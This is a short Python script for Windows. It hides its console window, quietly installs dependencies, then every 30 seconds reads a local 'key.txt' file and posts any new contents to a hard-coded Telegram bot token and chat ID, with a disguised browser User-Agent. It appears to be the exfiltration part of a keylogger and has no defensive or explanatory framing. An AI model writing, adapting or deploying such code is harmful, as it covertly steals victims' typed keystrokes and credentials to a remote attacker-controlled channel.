import os  
import time  
import sys  
import subprocess  
import ctypes  
import requests  

# Install libr
def install_deps():  
    subprocess.call([sys.executable, "-m", "pip", "install", "--quiet", "requests", "pywin32"],  
                    creationflags=0x08000000, stderr=subprocess.DEVNULL)  

try:  
    import win32gui  
    import win32con  
    win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)  
except:  
    kernel32 = ctypes.WinDLL('kernel32')  
    user32 = ctypes.WinDLL('user32')  
    hwnd = kernel32.GetConsoleWindow()  
    user32.ShowWindow(hwnd, 0)  

install_deps()  

TELEGRAM_TOKEN = "8147077794:AAGcUX3RdKxgXiDXp0uYIr5Y18YlmGZJGWE"  
CHAT_ID = "5476049714"  
LAST_CONTENT = ""

def send_data(data):  
    global LAST_CONTENT  
    if data != LAST_CONTENT:
        try:  
            requests.post(  
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",  
                json={"chat_id": CHAT_ID, "text": data},  
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}  
            )  
            LAST_CONTENT = data
        except:  
            pass  

def main():  
    while True:  
        if os.path.exists("key.txt"):  
            with open("key.txt", "r", encoding="utf-8", errors="ignore") as f:  
                content = f.read().strip()  
                if content:  
                    send_data(f"📥 New:\n{content}")  
        time.sleep(30)

if __name__ == "__main__":  
    main()  